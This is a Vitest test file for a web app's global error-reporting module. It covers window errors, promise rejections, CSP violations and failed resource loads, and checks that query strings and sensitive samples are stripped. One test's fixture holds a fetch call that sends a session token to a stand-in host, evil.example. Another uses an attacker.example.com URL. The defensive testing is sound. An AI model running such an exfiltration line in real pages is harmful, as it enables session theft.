// @vitest-environment jsdom

import { beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

const reportClientError = vi.fn();
vi.mock("../src/reportClientError.js", async (importOriginal) => ({
  ...(await importOriginal<typeof import("../src/reportClientError.js")>()),
  reportClientError,
}));

const { installGlobalErrorReporting } = await import("../src/globalErrorReporting.js");

describe("installGlobalErrorReporting", () => {
  beforeAll(() => {
    installGlobalErrorReporting();
  });

  beforeEach(() => {
    reportClientError.mockClear();
  });

  it("reports uncaught window errors", () => {
    const error = new Error("boom");
    window.dispatchEvent(new ErrorEvent("error", { message: "boom", error }));
    expect(reportClientError).toHaveBeenCalledWith(error, { source: "window-error" });
  });

  it("falls back to a message-only Error when the error event carries none (e.g. a cross-origin script error)", () => {
    window.dispatchEvent(new ErrorEvent("error", { message: "Script error." }));
    expect(reportClientError).toHaveBeenCalledTimes(1);
    const [err, ctx] = reportClientError.mock.calls[0];
    expect(err.message).toBe("Script error.");
    expect(ctx).toEqual({ source: "window-error" });
  });

  it("ignores benign ResizeObserver loop errors", () => {
    window.dispatchEvent(
      new ErrorEvent("error", { message: "ResizeObserver loop completed with undelivered notifications." }),
    );
    expect(reportClientError).not.toHaveBeenCalled();
  });

  it("reports unhandled promise rejections", () => {
    const reason = new Error("rejected");
    const event = new Event("unhandledrejection");
    Object.defineProperty(event, "reason", { value: reason });
    window.dispatchEvent(event);
    expect(reportClientError).toHaveBeenCalledWith(reason, { source: "unhandled-rejection" });
  });

  it("reports CSP violations with directive/source/line detail, stripping the source URL's query string", () => {
    const event = new Event("securitypolicyviolation");
    Object.defineProperty(event, "violatedDirective", { value: "script-src-elem" });
    Object.defineProperty(event, "blockedURI", { value: "inline" });
    Object.defineProperty(event, "sourceFile", {
      value: "https://admitto.example.com/admin/events/x/settings?tab=mail&token=secret123",
    });
    Object.defineProperty(event, "lineNumber", { value: 25 });
    document.dispatchEvent(event);

    expect(reportClientError).toHaveBeenCalledTimes(1);
    const [err, ctx] = reportClientError.mock.calls[0];
    expect(ctx).toEqual({ source: "csp-violation" });
    expect(err.message).toBe("script-src-elem blocked inline at https://admitto.example.com/admin/events/x/settings:25");
    expect(err.message).not.toContain("tab=mail");
    expect(err.message).not.toContain("token=secret123");
  });

  it("never includes the violation's sample text, even a sensitive one", () => {
    const event = new Event("securitypolicyviolation");
    Object.defineProperty(event, "violatedDirective", { value: "script-src-elem" });
    Object.defineProperty(event, "blockedURI", { value: "inline" });
    Object.defineProperty(event, "sourceFile", { value: "https://admitto.example.com/admin/events/x/settings" });
    Object.defineProperty(event, "lineNumber", { value: 25 });
    Object.defineProperty(event, "sample", {
      value: "fetch('https://evil.example/steal?token=user-secret-session-abc123')",
    });
    document.dispatchEvent(event);

    const [err] = reportClientError.mock.calls[0];
    expect(err.message).not.toContain("evil.example");
    expect(err.message).not.toContain("user-secret-session-abc123");
    expect(err.message).not.toContain("fetch(");
  });

  it("strips a query string from a blocked external resource URL too", () => {
    const event = new Event("securitypolicyviolation");
    Object.defineProperty(event, "violatedDirective", { value: "img-src" });
    Object.defineProperty(event, "blockedURI", { value: "https://tracker.example.com/pixel?uid=abc123" });
    document.dispatchEvent(event);

    const [err] = reportClientError.mock.calls[0];
    expect(err.message).toContain("blocked https://tracker.example.com/pixel ");
    expect(err.message).not.toContain("uid=abc123");
  });

  it("drops a CSP violation that blocks the client-error report endpoint itself, instead of looping forever", () => {
    const event = new Event("securitypolicyviolation");
    Object.defineProperty(event, "violatedDirective", { value: "connect-src" });
    Object.defineProperty(event, "blockedURI", {
      // Same-origin (window.location.origin in this jsdom env is http://localhost:3000) - the
      // one case the guard is meant to suppress.
      value: "http://localhost:3000/api/admin/client-errors",
    });
    document.dispatchEvent(event);

    expect(reportClientError).not.toHaveBeenCalled();
  });

  it("still reports a violation on a different origin, even one with the same path suffix", () => {
    // Own-review finding: a suffix-only match would let an attacker hide a genuinely malicious
    // cross-origin violation by picking a URL that merely ends in this path.
    const event = new Event("securitypolicyviolation");
    Object.defineProperty(event, "violatedDirective", { value: "connect-src" });
    Object.defineProperty(event, "blockedURI", {
      value: "https://attacker.example.com/api/admin/client-errors",
    });
    document.dispatchEvent(event);

    expect(reportClientError).toHaveBeenCalledTimes(1);
    const [err] = reportClientError.mock.calls[0];
    expect(err.message).toContain("https://attacker.example.com/api/admin/client-errors");
  });

  it("falls back to placeholders when the violation event has no blockedURI/sourceFile", () => {
    const event = new Event("securitypolicyviolation");
    Object.defineProperty(event, "violatedDirective", { value: "style-src" });
    Object.defineProperty(event, "lineNumber", { value: 0 });
    document.dispatchEvent(event);

    const [err] = reportClientError.mock.calls[0];
    expect(err.message).toBe("style-src blocked (inline) at ?:0");
  });

  it("reports a failed resource load (e.g. an injected <script src> that 404s) that a CSP violation wouldn't cover", () => {
    const script = document.createElement("script");
    script.src = "https://cdn.example.com/injected.js?v=abc123";
    document.body.appendChild(script);

    script.dispatchEvent(new Event("error"));

    expect(reportClientError).toHaveBeenCalledTimes(1);
    const [err, ctx] = reportClientError.mock.calls[0];
    expect(ctx).toEqual({ source: "resource-error" });
    expect(err.message).toBe("Failed to load script https://cdn.example.com/injected.js");

    document.body.removeChild(script);
  });

  it("reports a failed stylesheet load by its href", () => {
    const link = document.createElement("link");
    link.rel = "stylesheet";
    link.href = "https://cdn.example.com/theme.css?v=abc123";
    document.body.appendChild(link);

    link.dispatchEvent(new Event("error"));

    const [err] = reportClientError.mock.calls[0];
    expect(err.message).toBe("Failed to load link https://cdn.example.com/theme.css");

    document.body.removeChild(link);
  });

  it("reports a resource-error event whose target isn't an Element at all", () => {
    window.dispatchEvent(new Event("error"));

    const [err, ctx] = reportClientError.mock.calls[0];
    expect(ctx).toEqual({ source: "resource-error" });
    expect(err.message).toBe("Failed to load resource");
  });

  it("reports a failed load for an element type with no src/href to point at", () => {
    const iframe = document.createElement("iframe");
    document.body.appendChild(iframe);

    iframe.dispatchEvent(new Event("error"));

    const [err] = reportClientError.mock.calls[0];
    expect(err.message).toBe("Failed to load iframe");

    document.body.removeChild(iframe);
  });
});
